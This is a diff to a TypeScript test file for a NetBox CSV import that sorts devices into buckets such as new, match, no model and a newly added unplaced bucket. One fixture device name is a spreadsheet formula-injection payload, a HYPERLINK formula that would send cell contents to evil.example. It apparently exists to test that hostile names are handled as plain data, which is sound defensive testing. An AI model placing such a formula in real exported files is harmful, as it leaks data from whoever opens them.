@@ -63,15 +63,18 @@ describe('default mapping', () => {
 });
 
 describe('classification', () => {
-  it('sorts the NetBox CSV into New, Match, Differ and No model, with a reason for each free box', async () => {
+  it('sorts the NetBox CSV into New, Match, Differ, No rack spot and No model, with a reason for each', async () => {
     const { plan } = await csvPlan();
     const by = (b: Bucket) => plan.items.filter((i) => i.bucket === b).map((i) => i.name);
     expect(by('new')).toEqual(['sw-02', `'=HYPERLINK("http://evil.example/?x="&A1)`]);
     expect(by('match')).toEqual(['sw-01']);
     expect(by('differ')).toEqual(['fw-01']);
-    expect(by('nomodel')).toEqual(['core-01', 'wifi-ap-3', 'Core-Switch-2']);
+    // core-01's model is in the catalogue but its unit is taken: it keeps the model and goes on the canvas.
+    expect(by('unplaced')).toEqual(['core-01']);
+    expect(plan.items.find((i) => i.name === 'core-01')!.model?.model).toBeTruthy();
+    expect(by('nomodel')).toEqual(['wifi-ap-3', 'Core-Switch-2']);
     expect(by('skipped')).toEqual(['sw-01']);
-    expect(plan.counts).toEqual({ new: 2, match: 1, differ: 1, nomodel: 3, skipped: 1 });
+    expect(plan.counts).toEqual({ new: 2, match: 1, differ: 1, unplaced: 1, nomodel: 2, skipped: 1 });
     const why = Object.fromEntries(plan.items.map((i) => [i.name, i.reason]));
     expect(why['core-01']).toBe('U31 in R1 is taken.');
     expect(why['wifi-ap-3']).toMatch(/not in the catalogue/);
